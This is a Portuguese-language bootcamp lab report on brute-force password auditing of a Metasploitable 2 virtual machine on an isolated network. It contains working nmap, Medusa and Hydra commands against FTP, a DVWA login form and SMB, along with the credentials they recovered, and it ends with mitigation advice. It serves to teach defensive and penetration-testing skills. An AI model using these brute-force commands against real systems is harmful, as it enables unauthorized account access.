# 🔐 Projeto: Auditoria de Força Bruta com Medusa & Hydra  
**Autor:** gmsfox
**Data:** 24/10/2025  
**Bootcamp Santander 2025 | DIO — Cibersegurança e Pentest Ético**

---

## 🧭 1. Preparação do Ambiente

**Data do teste:** ‎12‎/‎10‎/‎2025 — 20:51:21  
**Snapshot:** criado antes dos testes (scan rápido e completo)  
**Alvo:** `192.168.56.101` (Metasploitable 2)  
**Atacante:** Kali Linux  
**Rede:** Host-Only no VirtualBox  

---

## 🔎 2. Reconhecimento Básico

**Comando:**
```bash
nmap -sC -sV -oN nmap_rapido.txt 192.168.56.101
```

**Principais portas identificadas:**
```
21/tcp    open  ftp         vsftpd 2.3.4
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
53/tcp    open  domain      ISC BIND 9.4.2
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp   open  netbios-ssn Samba smbd 3.0.20-Debian
3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp  open  postgresql  PostgreSQL 8.3.x
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
```

---

## 🔍 3. Reconhecimento Completo

**Comando:**
```bash
nmap -A -p- -oN nmap_completo.txt 192.168.56.101
```

**Destaques importantes:**
- FTP anônimo habilitado (`Anonymous FTP login allowed`)  
- SSH ativo (OpenSSH 4.7p1)  
- Serviço SMB vulnerável (`Samba 3.0.20-Debian`)  
- HTTP (DVWA e Tomcat 5.5) expostos  
- MySQL, PostgreSQL e IRC abertos  

🟢 **Vulnerabilidades acionáveis:**  
- Login anônimo FTP → acesso direto sem credenciais  
- Samba sem assinatura → suscetível a força bruta SMB  
- DVWA exposta → alvo ideal para ataque de formulário web  

---

## 🧾 4. Wordlists Criadas

**Arquivo:** `/home/kali/Desktop/wordlist/`

| Nome | Tamanho | Origem |
|------|----------|---------|
| **rockyou.txt** | 133.4 MB | `/usr/share/wordlists/rockyou.txt` |
| **gmsfox6.txt** | 6.7 MB (1 M senhas) | Gerado com `crunch 6 6 0123456789` |
| **user2.txt** | 4 KB | Criado manualmente (`user`, `msfadmin`, `admin`, `root`) |
| **password2.txt** | 4 KB | Criado manualmente (`123456`, `password`, `qwerty`, `msfadmin`) |

**Comandos usados:**
```bash
cp /usr/share/wordlists/rockyou.txt /home/kali/Desktop/wordlist
crunch 6 6 0123456789 -o gmsfox6.txt
echo -e "user\nmsfadmin\nadmin\nroot" > user2.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > password2.txt
```

---

## 💥 5. Desafio A — Ataque de Força Bruta em FTP (Medusa)

**Comando executado:**
```bash
medusa -h 192.168.56.101 -U /home/kali/Desktop/wordlist/user2.txt -P /home/kali/Desktop/wordlist/password2.txt -M ftp | tee /home/kali/Desktop/wordlist/reports/ftp_results.txt
```

**Resultado:**
```
ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
```

**Validação manual:**
```bash
ftp 192.168.56.101
# Login: msfadmin
# Password: msfadmin
230 Login successful.
```

✅ **Acesso confirmado via FTP**.

---

## 🌐 6. Desafio B — Força Bruta em Formulário Web (DVWA)

**Comando:**
```bash
hydra -l admin -P /home/kali/Desktop/wordlist/password2.txt 192.168.56.101 http-form-post "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:S=location"
```

**Saída:**
```
[80][http-post-form] host: 192.168.56.101   login: admin   password: qwerty
[80][http-post-form] host: 192.168.56.101   login: admin   password: msfadmin
[80][http-post-form] host: 192.168.56.101   login: admin   password: 123456
[80][http-post-form] host: 192.168.56.101   login: admin   password: admin
[80][http-post-form] host: 192.168.56.101   login: admin   password: password
```

**Acesso bem-sucedido:**  
> URL: [http://192.168.56.101/dvwa/login.php](http://192.168.56.101/dvwa/login.php)  
> **Usuário:** admin  
> **Senha:** password  

---

## 🧱 7. Desafio C — Enumeração e Password Spraying em SMB

**Enumeração:**
```bash
enum4linux -a 192.168.56.101 | tee enum4linux.txt
```

**Resumo dos achados:**
- Workgroup: `WORKGROUP`  
- Servidor Samba: `3.0.20-Debian`  
- Usuários detectados: `root`, `ftp`, `postgres`, `msfadmin`, `daemon`, `mysql`, `www-data`, etc.  
- Shares acessíveis:  
  - `tmp` → acesso permitido  
  - `opt`, `print$`, `ADMIN$` → acesso negado  

**Ataque SMB (Medusa):**
```bash
medusa -h 192.168.56.101 -U /home/kali/Desktop/wordlist/user2.txt -P /home/kali/Desktop/wordlist/password2.txt -M smbnt
```

**Resultado:**
```
ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
```

**Validação:**
```bash
smbclient -L //192.168.56.101/ -U msfadmin
```

**Shares acessíveis:**
```
print$     Disk
tmp        Disk
opt        Disk
ADMIN$     IPC
msfadmin   Disk (Home Directory)
```

✅ **Acesso SMB confirmado via msfadmin:msfadmin**

---

## 🛡️ 8. Recomendações de Mitigação

| Serviço | Risco | Medidas de Mitigação |
|----------|-------|----------------------|
| **FTP** | Acesso anônimo e senhas fracas | Desativar FTP, usar SFTP, implementar fail2ban, forçar políticas de senha forte |
| **DVWA / Web** | Falta de proteção contra brute-force | Adicionar CAPTCHA, MFA, bloquear tentativas excessivas e armazenar senhas com hash |
| **SMB** | Senhas fracas e SMBv1 habilitado | Atualizar para SMBv3, bloquear SMBv1, implementar bloqueio de tentativas e senhas fortes |

---

## 📚 9. Conclusão

Este laboratório simulou um cenário de ataque ético completo, explorando vulnerabilidades comuns de autenticação.  
O aprendizado incluiu:
- Uso prático de **Medusa** e **Hydra**  
- Enumeração com **Nmap** e **Enum4linux**  
- Identificação de **credenciais fracas e serviços vulneráveis**  
- Documentação técnica e mitigação de riscos  

Todos os testes foram realizados em ambiente **controlado e isolado** (VirtualBox host-only).
